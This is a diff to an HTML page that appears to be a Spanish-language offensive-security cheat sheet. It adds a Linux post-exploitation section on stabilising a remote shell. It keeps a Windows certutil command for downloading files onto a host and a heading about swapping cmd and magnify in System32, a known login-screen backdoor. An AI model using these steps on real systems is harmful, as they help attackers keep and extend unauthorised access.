@@ -30,14 +30,41 @@
 				</ul>
 			</nav>
 		</header>
-			<!--Windows cambiando lupa por cmp-->
 			<ul id="comandos">
+				<!--Linux-->
+				<button onclick="leerMasLinux()" id="leerMasLinux">Linux</button>
+				<div class="linux" id="linux" style="display: none;">
+					<p>Tratamiento de la terminal en linux (Post-explotación)</p>
+					<p>(En la terminal remota) > script /dev/null -c bash</p>
+					<p>ctrl z</p>
+					<p>(En maquina local) stty raw -echo; fg</p>
+					<p>reset</p>
+					<p>terminal type? xterm</p>
+					<p>para que funcione ctrl l:</p>
+					<p>export TERM=xterm</p>
+					<p>export SHELL=bash</p>
+					<p>Adaptar pantalla:</p>
+					<p>stty rows 51 columsn 189</p>
+				</div>
+				<script>
+					function leerMasLinux() {
+						var x = document.getElementById("linux");
+						if (x.style.display === "none") {
+							x.style.display = "block";
+						} else {
+							x.style.display = "none";
+						}
+					}
+				</script>
+
+				<!--Windows-->
 				<button onclick="leerMasWindows()" id="leerMasWindows" class="block">Windows</button>
 				<div class="windows" id="windows" style="display: none;">
 					<p>Comando para descargar archivos desde windows</p>
 					<p id="ejemplo">certutil.exe -urlcache -split -f [URL] [NOMBRE_ARCHIVO]</p>
 					</p>
 
+					<!--Windows: cambiando lupa por cmp-->
 					<p>Cambio de los nombres cmd y magnify en Windows/System32/</p>
 
 					<p id="ejemplo">
